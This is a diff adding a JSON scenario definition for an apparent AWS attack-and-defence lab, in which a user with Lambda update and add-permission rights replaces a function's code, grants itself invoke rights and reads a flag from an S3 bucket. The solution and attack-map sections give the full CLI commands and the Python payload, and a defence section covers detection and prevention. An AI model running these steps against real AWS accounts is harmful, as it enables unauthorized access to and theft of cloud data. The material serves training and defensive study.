@@ -1,0 +1,225 @@
+{
+  "displayName": "Lambda Code Update + Permission Grant to Bucket",
+  "name": "lambda-005-lambda-updatefunctioncode+lambda-addpermission",
+  "description": "User with lambda:UpdateFunctionCode and lambda:AddPermission can modify existing Lambda function code, grant themselves invoke permission, and read sensitive S3 bucket contents using the function's privileged role",
+  "costEstimate": "$0/mo",
+  "pathfindingCloudId": "lambda-005",
+  "interactiveDemo": false,
+  "supportsOnlineMode": false,
+  "category": "Privilege Escalation",
+  "subCategory": "existing-passrole",
+  "pathType": "one-hop",
+  "target": "to-bucket",
+  "environments": [
+    "prod"
+  ],
+  "attackPath": {
+    "principals": [],
+    "summary": ""
+  },
+  "mitreAttack": {
+    "tactics": [
+      "TA0004 - Privilege Escalation",
+      "TA0009 - Collection"
+    ],
+    "techniques": [
+      "T1530 - Data from Cloud Storage Object",
+      "T1648 - Serverless Execution"
+    ]
+  },
+  "terraform": {
+    "variableName": "enable_single_account_privesc_one_hop_to_bucket_lambda_005_lambda_updatefunctioncode_lambda_addpermission",
+    "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-bucket/lambda-005-lambda-updatefunctioncode+lambda-addpermission"
+  },
+  "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-bucket/lambda-005-lambda-updatefunctioncode+lambda-addpermission",
+  "schemaVersion": "4.7.1",
+  "permissions": {
+    "principals": [
+      {
+        "name": "pl-prod-lambda-005-to-bucket-starting-user",
+        "required": [
+          {
+            "permission": "lambda:UpdateFunctionCode",
+            "resource": "arn:aws:lambda:*:*:function/pl-prod-lambda-005-to-bucket-target-lambda",
+            "description": "replace existing function code with a payload that reads from the target S3 bucket"
+          },
+          {
+            "permission": "lambda:AddPermission",
+            "resource": "arn:aws:lambda:*:*:function/pl-prod-lambda-005-to-bucket-target-lambda",
+            "description": "add a resource-based policy statement granting self-invocation"
+          },
+          {
+            "permission": "lambda:InvokeFunction",
+            "resource": "arn:aws:lambda:*:*:function/pl-prod-lambda-005-to-bucket-target-lambda",
+            "description": "trigger execution of the malicious payload under the privileged role"
+          }
+        ],
+        "helpful": [
+          {
+            "permission": "lambda:GetFunction",
+            "purpose": "discover the target Lambda function's execution role ARN and handler name"
+          },
+          {
+            "permission": "lambda:GetPolicy",
+            "purpose": "verify the resource-based policy statement was successfully added"
+          },
+          {
+            "permission": "lambda:ListFunctions",
+            "purpose": "enumerate available Lambda functions to identify high-privilege targets"
+          }
+        ]
+      }
+    ]
+  },
+  "readme": {
+    "objective": "Your objective is to learn how to exploit a privilege escalation vulnerability that allows you to move from the `pl-prod-lambda-005-to-bucket-starting-user` IAM user to the `pl-prod-lambda-005-to-bucket-{account_id}-{suffix}` S3 bucket by modifying an existing Lambda function's code with a payload that reads the flag, granting yourself invocation rights via a resource-based policy, and executing the function to extract the flag from the bucket.\n\n- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user`\n- **Destination resource:** `arn:aws:s3:::pl-prod-lambda-005-to-bucket-{account_id}-{suffix}`",
+    "setup": {
+      "prerequisites": "1. Install the `plabs` CLI:\n   ```bash\n   brew install pathfinding-labs/tap/plabs\n   ```\n2. Configure your AWS profiles in `~/.plabs/plabs.yaml` (or run `plabs init` if you haven't already)",
+      "deployNonInteractive": "```bash\nplabs enable lambda-005-to-bucket\nplabs apply\n```",
+      "deployTui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-005-to-bucket` in the scenarios list\n3. Press `space` to enable it\n4. Press `a` to apply"
+    },
+    "attack": {
+      "resourcesCreated": "| ARN | Purpose |\n| -- | -- |\n| `arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user` | Scenario-specific starting user with access keys |\n| `arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-005-to-bucket-target-lambda` | Pre-existing Lambda function that runs benign code (victim workload) |\n| `arn:aws:iam::{account_id}:role/pl-prod-lambda-005-to-bucket-lambda-exec-role` | Lambda execution role with S3 read access to the target bucket |\n| `arn:aws:s3:::pl-prod-lambda-005-to-bucket-{account_id}-{suffix}` | Target S3 bucket containing the CTF flag (`flag.txt`) |",
+      "demoAttack": {
+        "executing": "The script will:\n1. Retrieve the starting user credentials from Terraform outputs\n2. Verify identity as `pl-prod-lambda-005-to-bucket-starting-user`\n3. Confirm the starting user lacks direct S3 access\n4. Fetch the existing Lambda configuration (handler name and execution role ARN)\n5. Craft a malicious payload that reads `flag.txt` from the target S3 bucket and returns it in the response\n6. Update the Lambda function code with the malicious payload\n7. Add a resource-based policy statement granting self-invocation via `lambda:AddPermission`\n8. Invoke the modified Lambda function and extract the flag from the response body",
+        "resourcesCreated": "- Resource-based policy statement on the target Lambda function granting the starting user `lambda:InvokeFunction`\n- Modified Lambda function code in `pl-prod-lambda-005-to-bucket-target-lambda` (replaced with S3-reading payload)",
+        "nonInteractive": "```bash\nplabs demo --list\nplabs demo lambda-005-lambda-updatefunctioncode+lambda-addpermission\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-005-to-bucket` in the scenarios list\n3. Press `r` to run the demo script"
+      },
+      "cleanup": {
+        "nonInteractive": "```bash\nplabs cleanup --list\nplabs cleanup lambda-005-lambda-updatefunctioncode+lambda-addpermission\n```",
+        "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-005-to-bucket` in the scenarios list\n3. Press `c` to run the cleanup script"
+      }
+    },
+    "teardown": {
+      "nonInteractive": "```bash\nplabs disable lambda-005-to-bucket\nplabs apply\n```",
+      "tui": "1. Launch the TUI: `plabs`\n2. Navigate to `lambda-005-to-bucket` in the scenarios list\n3. Press `space` to disable it\n4. Press `D` to destroy"
+    },
+    "defend": {
+      "cspm": {
+        "whatToDetect": "- **Overly Permissive Lambda Update Access**: IAM principals with `lambda:UpdateFunctionCode` on Lambda functions whose execution roles have S3 read access\n- **Lambda Functions with Scoped S3 Access**: Lambda execution roles that grant `s3:GetObject` on buckets containing sensitive data, combined with code update permissions on the function\n- **Resource Policy Modification Access**: Principals with `lambda:AddPermission` on privileged Lambda functions can bypass resource-based policy protections intended to restrict invocation\n- **Privilege Escalation Path**: The combination of `lambda:UpdateFunctionCode`, `lambda:AddPermission`, and `lambda:InvokeFunction` on a function with an S3-capable execution role creates a complete data exfiltration path\n- **Lack of Code Signing**: Lambda functions without code signing enforcement allow arbitrary code to be injected and run under the execution role's identity\n- **Missing Resource Conditions**: Lambda update policies lacking resource-based conditions that restrict which functions or callers are eligible",
+        "prevention": "- **Implement Code Signing**: Require Lambda functions with privileged execution roles to use code signing, preventing unauthorized code modifications\n- **Apply Least Privilege to Execution Roles**: Lambda execution roles should have `s3:GetObject` scoped to only the specific bucket paths required, never broad S3 access\n- **Restrict Update Permissions**: Limit `lambda:UpdateFunctionCode` to dedicated CI/CD service roles with strict condition keys (`lambda:FunctionArn`, `aws:RequestedRegion`)\n- **Protect Resource Policies**: Deny `lambda:AddPermission` for general-purpose roles via SCPs or permission boundaries; only allow it from deployment pipeline identities\n- **Separate Deployment and Data Access**: Use separate IAM roles for deploying Lambda functions and for those functions' runtime access to sensitive data stores\n- **Enable CloudTrail Monitoring**: Alert on `UpdateFunctionCode20150331v2`, `AddPermission20150331v2`, and `Invoke` events on functions with S3-capable execution roles"
+      },
+      "cloudSiem": {
+        "cloudTrailEvents": "- `lambda:UpdateFunctionCode20150331v2` -- Lambda function code modified; high severity when the target function's execution role has S3 read/write access\n- `lambda:AddPermission20150331v2` -- Resource-based policy statement added to a Lambda function; indicates an attacker may be granting themselves invocation rights on a privileged function\n- `lambda:Invoke` -- Lambda function invoked; high severity when preceded by a code update and permission addition on a function with an S3-capable execution role\n- `s3:GetObject` -- Object retrieved from S3 bucket; high severity when the request comes from a Lambda execution role following an unexpected code update",
+        "detonationLogs": "_Detonation log integration (Stratus Red Team / Grimoire) is planned for a future release._"
+      }
+    },
+    "references": "- [Lambda Code Update + Permission Grant to Admin (lambda-005)](https://pathfinding.cloud/paths/lambda-005) -- pathfinding.cloud path entry for the lambda-005 technique\n- [T1648 - Serverless Execution](https://attack.mitre.org/techniques/T1648/) -- MITRE ATT&CK technique for abusing serverless execution environments\n- [T1530 - Data from Cloud Storage Object](https://attack.mitre.org/techniques/T1530/) -- MITRE ATT&CK technique for accessing cloud storage data",
+    "solution": "# Solution: Lambda Code Update + Permission Grant to Bucket\n\nThis scenario demonstrates a data exfiltration path that combines two Lambda permissions: `lambda:UpdateFunctionCode` to inject a malicious payload into an existing function, and `lambda:AddPermission` to grant yourself the invocation rights needed to trigger it. The combination lets you turn a victim Lambda function into a data-retrieval proxy that runs under a privileged execution role \u2014 without ever directly touching S3 from your starting credentials.\n\nWhat makes this variant particularly dangerous is the `lambda:AddPermission` requirement. In environments that implement resource-based policies on Lambda functions as a defense-in-depth measure, a plain `UpdateFunctionCode` attack would be blocked at the invocation step. Adding `lambda:AddPermission` to the attacker's permissions removes that protection entirely: the attacker simply writes themselves into the function's resource policy and proceeds.\n\nIn real environments, this attack surface appears wherever deployment automation \u2014 CI/CD pipelines, developer tooling, or infrastructure-as-code runners \u2014 is granted broad Lambda update access. The execution role holding scoped S3 access is a common pattern for Lambda functions that read configuration, process data, or deliver reports. An attacker who can update that function's code inherits the role's data access without ever assuming the role directly.\n\n## The Challenge\n\nYou start as `pl-prod-lambda-005-to-bucket-starting-user` with credentials provided by the Terraform deployment. Your permissions are narrow: you can update code on one specific Lambda function (`pl-prod-lambda-005-to-bucket-target-lambda`), modify its resource-based policy, and invoke it. You cannot call S3 directly, cannot assume the Lambda execution role, and have no administrative path open to you.\n\nThe target is the S3 bucket `pl-prod-lambda-005-to-bucket-{account_id}-{suffix}`, which contains `flag.txt`. The Lambda function's execution role (`pl-prod-lambda-005-to-bucket-lambda-exec-role`) has `s3:GetObject` access to that bucket. Your job is to make the function retrieve the flag and hand it back to you.\n\nThere is one extra obstacle compared to a plain `UpdateFunctionCode` scenario: the function's resource-based policy does not initially allow your user to invoke it. You will need to add that permission yourself before you can pull the trigger.\n\n## Reconnaissance\n\nStart by confirming your identity and verifying that you have no direct S3 access:\n\n```bash\naws sts get-caller-identity --query 'Arn' --output text\n# arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user\n\naws s3 ls\n# An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied\n```\n\nGood \u2014 the starting user is blocked from S3. Now inspect the target Lambda to understand what you're working with:\n\n```bash\naws lambda get-function \\\n  --function-name pl-prod-lambda-005-to-bucket-target-lambda \\\n  --query '{Handler:Configuration.Handler,Role:Configuration.Role}'\n```\n\nThis gives you two critical pieces of information: the handler name (you must match it exactly when crafting your payload) and the execution role ARN (which has `s3:GetObject` on the target bucket). Check the current resource-based policy to confirm the invocation restriction:\n\n```bash\naws lambda get-policy \\\n  --function-name pl-prod-lambda-005-to-bucket-target-lambda\n# Either NoSuchResource or a policy that does not allow your user -- AddPermission is required either way\n```\n\nYou can also use your helpful permissions to confirm there are Lambda functions worth targeting and to find the target bucket name:\n\n```bash\naws lambda list-functions --query 'Functions[].FunctionName'\n\n# The bucket name is an output from the Terraform deployment, but you can also\n# derive it from the execution role's inline policy if you have iam:GetRolePolicy available\n```\n\n## Exploitation\n\n### Step 1: Craft the malicious payload\n\nCreate a Python file whose name matches the Lambda handler. If the handler is `lambda_function.lambda_handler`, your file must be named `lambda_function.py`. The payload uses the execution role's identity to call `s3:GetObject` on the target bucket and returns the flag in the response body:\n\n```bash\ncat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport json\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    bucket = event.get('bucket')\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8')\n    return {\n        'statusCode': 200,\n        'body': flag\n    }\nEOF\n\ncd /tmp && zip malicious_lambda.zip lambda_function.py\n```\n\n### Step 2: Replace the function code\n\n```bash\naws lambda update-function-code \\\n  --function-name pl-prod-lambda-005-to-bucket-target-lambda \\\n  --zip-file fileb:///tmp/malicious_lambda.zip\n```\n\nThe function now contains your malicious code. But you still cannot invoke it because the resource policy does not include your user.\n\n### Step 3: Grant yourself invocation rights\n\n```bash\naws lambda add-permission \\\n  --function-name pl-prod-lambda-005-to-bucket-target-lambda \\\n  --statement-id allow-self-invoke \\\n  --action lambda:InvokeFunction \\\n  --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user\n```\n\nThis appends a statement to the function's resource-based policy that explicitly allows your user to invoke it. Lambda evaluates both the identity-based policy (which already permits `lambda:InvokeFunction` on this function) and the resource-based policy -- both must allow the call. The `add-permission` call satisfies the resource-policy side of that check.\n\nYou can verify the policy was added:\n\n```bash\naws lambda get-policy \\\n  --function-name pl-prod-lambda-005-to-bucket-target-lambda \\\n  --query 'Policy' --output text | python3 -m json.tool\n```\n\n### Step 4: Invoke the function\n\nWait a few seconds for the code update to propagate, then invoke the function with the target bucket name in the payload:\n\n```bash\naws lambda invoke \\\n  --function-name pl-prod-lambda-005-to-bucket-target-lambda \\\n  --payload \"{\\\"bucket\\\": \\\"pl-prod-lambda-005-to-bucket-{account_id}-{suffix}\\\"}\" \\\n  /tmp/lambda-response.json\n\ncat /tmp/lambda-response.json\n# {\"statusCode\": 200, \"body\": \"flag{...}\"}\n```\n\nThe function executed under `pl-prod-lambda-005-to-bucket-lambda-exec-role`, which has `s3:GetObject` on the target bucket. The flag value is now in the response body.\n\n## Verification\n\nThe flag appears directly in the Lambda invocation response. To confirm the execution role was what actually read the data \u2014 not your starting user \u2014 you can check that a direct S3 call still fails from the starting user's credentials:\n\n```bash\naws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -\n# An error occurred (AccessDenied) -- your starting user still has no direct S3 access\n```\n\nThis confirms the exfiltration happened indirectly through the Lambda execution role, exactly as intended.\n\n## Capture the Flag\n\nThe flag is stored as `flag.txt` inside the target S3 bucket. You have already read it via the Lambda invocation response, but the canonical retrieval command using the access you gained through the execution role is:\n\n```bash\naws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -\n```\n\nThe `aws s3 cp ... -` syntax streams the object to stdout. To run this directly you would need credentials for `pl-prod-lambda-005-to-bucket-lambda-exec-role`, which your starting user cannot assume. In practice, the Lambda invocation is the equivalent step: the function body is your code, the execution role is your identity, and the flag arrives in the invocation response. The value printed in the `body` field of the Lambda response is the flag you submit to complete the challenge.\n\n## What Happened\n\nYou started with three Lambda permissions \u2014 `UpdateFunctionCode`, `AddPermission`, and `InvokeFunction` \u2014 and used them to turn a victim Lambda function into a data exfiltration proxy. The execution role already had the S3 access needed to read the flag; you just replaced the code that runs under that role with code that does what you want, then unlocked your own ability to trigger it.\n\nThe `lambda:AddPermission` step is what distinguishes this technique from a simpler code-update attack. An organization that uses Lambda resource policies to restrict which callers can invoke a privileged function believes that restriction offers protection even if code update permissions are broadly granted. This scenario demonstrates that belief is wrong: `AddPermission` lets an attacker rewrite the resource policy, eliminating the protection.\n\nIn a real environment the remediation is layered: enforce Lambda code signing to prevent unauthorized code changes, scope execution roles to only the exact S3 paths each function needs, and restrict `lambda:AddPermission` to CI/CD pipeline identities using SCPs or permission boundaries. Monitoring for `UpdateFunctionCode` followed shortly by `AddPermission` and `Invoke` on the same function is a high-fidelity signal for this exact attack pattern.\n"
+  },
+  "attackMap": {
+    "nodes": [
+      {
+        "id": "starting-principal",
+        "label": "Starting User",
+        "type": "principal",
+        "subType": "iam-user",
+        "arn": "arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user",
+        "access": {
+          "type": "assumed-breach-credentials"
+        },
+        "description": "You have gained access to this principal's AWS IAM credentials. These could have been obtained through many real-world vectors: phishing a developer and gaining access to their workstation, compromising a browser session, exploiting a vulnerable workload running in this AWS account, discovering credentials in a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.\nRegardless of how you obtained them, you are now operating as this principal. This IAM user has lambda:UpdateFunctionCode, lambda:AddPermission, and lambda:InvokeFunction permissions on the target Lambda function. The target function runs under an execution role with S3 read access to the sensitive target bucket.\n"
+      },
+      {
+        "id": "target-lambda",
+        "label": "Target Lambda",
+        "type": "resource",
+        "subType": "lambda-function",
+        "arn": "arn:aws:lambda:{region}:{account_id}:function/pl-prod-lambda-005-to-bucket-target-lambda",
+        "description": "This Lambda function runs benign code but its execution role has s3:GetObject access to the target S3 bucket. The function's resource-based policy initially does not allow the starting user to invoke it. By replacing the function code with a payload that reads the flag and granting yourself invocation rights, you can use this function as a data exfiltration proxy running under its privileged execution role.\n"
+      },
+      {
+        "id": "lambda-exec-role",
+        "label": "Lambda Exec Role",
+        "type": "principal",
+        "subType": "iam-role",
+        "arn": "arn:aws:iam::{account_id}:role/pl-prod-lambda-005-to-bucket-lambda-exec-role",
+        "description": "This IAM role is the execution role of the target Lambda function. It has s3:GetObject access to the target S3 bucket. When you invoke the malicious Lambda payload, the code executes under this role's identity -- allowing the function to read the flag from the bucket and return it in the response.\n"
+      },
+      {
+        "id": "target-bucket",
+        "label": "Target S3 Bucket",
+        "type": "resource",
+        "subType": "s3-bucket",
+        "isTarget": true,
+        "arn": "arn:aws:s3:::pl-prod-lambda-005-to-bucket-{account_id}-{suffix}",
+        "description": "The target S3 bucket containing the CTF flag stored as flag.txt. The Lambda execution role has s3:GetObject access to this bucket. Your malicious Lambda payload reads flag.txt and returns its contents in the invocation response, completing the data exfiltration path.\n"
+      }
+    ],
+    "edges": [
+      {
+        "from": "starting-principal",
+        "to": "target-lambda",
+        "label": "lambda:UpdateFunctionCode",
+        "description": "Fetch the existing Lambda function configuration to identify the handler name and execution role, then replace the function code with a malicious payload. The payload reads flag.txt from the target S3 bucket using the execution role's s3:GetObject permission and returns the flag value in the response body.\n",
+        "hints": [
+          "Fetch the existing function config with lambda:GetFunction to confirm the Handler field, then craft a payload whose filename matches the handler (e.g., handler lambda_function.lambda_handler requires a file named lambda_function.py). The payload should use boto3 to call s3:GetObject on the target bucket and return the contents in the response body.",
+          "After updating the code, use lambda:AddPermission to append a statement to the function's resource-based policy granting your user lambda:InvokeFunction -- this step is required because the function's initial resource policy does not allow the starting user to invoke it. Then invoke and read the flag from the response. Wait a few seconds after the code upload before invoking.",
+          "Browse to https://pathfinding.cloud/paths/lambda-005 for technique details."
+        ],
+        "commands": [
+          {
+            "description": "Get the current function details including handler name and execution role",
+            "command": "aws lambda get-function --function-name pl-prod-lambda-005-to-bucket-target-lambda --query '{Handler:Configuration.Handler,Role:Configuration.Role}'"
+          },
+          {
+            "description": "Create malicious Python payload that reads the flag from S3",
+            "command": "cat > /tmp/lambda_function.py << 'EOF'\nimport boto3\nimport json\n\ndef lambda_handler(event, context):\n    s3 = boto3.client('s3')\n    bucket = event.get('bucket')\n    obj = s3.get_object(Bucket=bucket, Key='flag.txt')\n    flag = obj['Body'].read().decode('utf-8')\n    return {'statusCode': 200, 'body': flag}\nEOF"
+          },
+          {
+            "description": "Package the malicious code",
+            "command": "cd /tmp && zip malicious_lambda.zip lambda_function.py"
+          },
+          {
+            "description": "Update the Lambda function with the malicious payload",
+            "command": "aws lambda update-function-code --function-name pl-prod-lambda-005-to-bucket-target-lambda --zip-file fileb:///tmp/malicious_lambda.zip"
+          },
+          {
+            "description": "Grant self-invocation permission via resource-based policy",
+            "command": "aws lambda add-permission --function-name pl-prod-lambda-005-to-bucket-target-lambda --statement-id allow-self-invoke --action lambda:InvokeFunction --principal arn:aws:iam::{account_id}:user/pl-prod-lambda-005-to-bucket-starting-user"
+          },
+          {
+            "description": "Invoke the malicious Lambda and pass the target bucket name",
+            "command": "aws lambda invoke --function-name pl-prod-lambda-005-to-bucket-target-lambda --payload '{\"bucket\": \"pl-prod-lambda-005-to-bucket-{account_id}-{suffix}\"}' /tmp/lambda-response.json && cat /tmp/lambda-response.json"
+          }
+        ]
+      },
+      {
+        "from": "target-lambda",
+        "to": "lambda-exec-role",
+        "label": "lambda:InvokeFunction",
+        "description": "The malicious Lambda payload executes under the privileged execution role. The function reads flag.txt from the target S3 bucket using the execution role's s3:GetObject permission and returns the flag in the response body.\n",
+        "hints": [],
+        "commands": []
+      },
+      {
+        "from": "lambda-exec-role",
+        "to": "target-bucket",
+        "label": "s3:GetObject",
+        "description": "The Lambda execution role's s3:GetObject permission is exercised by the malicious payload to read flag.txt from the target bucket. The flag value is returned in the Lambda invocation response body, completing the data exfiltration path.\n",
+        "hints": [
+          "The flag arrives in the Lambda invocation response body -- read it from the output file written by lambda:InvokeFunction. The execution role's s3:GetObject permission did the actual bucket read; your payload was the mechanism."
+        ],
+        "commands": [
+          {
+            "description": "Capture the CTF flag from the invocation response",
+            "command": "cat /tmp/lambda-response.json"
+          },
+          {
+            "description": "Alternatively, retrieve flag.txt directly once you control the execution role's actions",
+            "command": "aws s3 cp s3://pl-prod-lambda-005-to-bucket-{account_id}-{suffix}/flag.txt -"
+          }
+        ]
+      }
+    ]
+  },
+  "hasAttackMap": true,
+  "principalHopCount": 1,
+  "startAccessType": "assumed-breach-credentials",
+  "services": [
+    "lambda"
+  ],
+  "slug": "lambda-005-to-bucket",
+  "hasDemoTranscript": true
+}
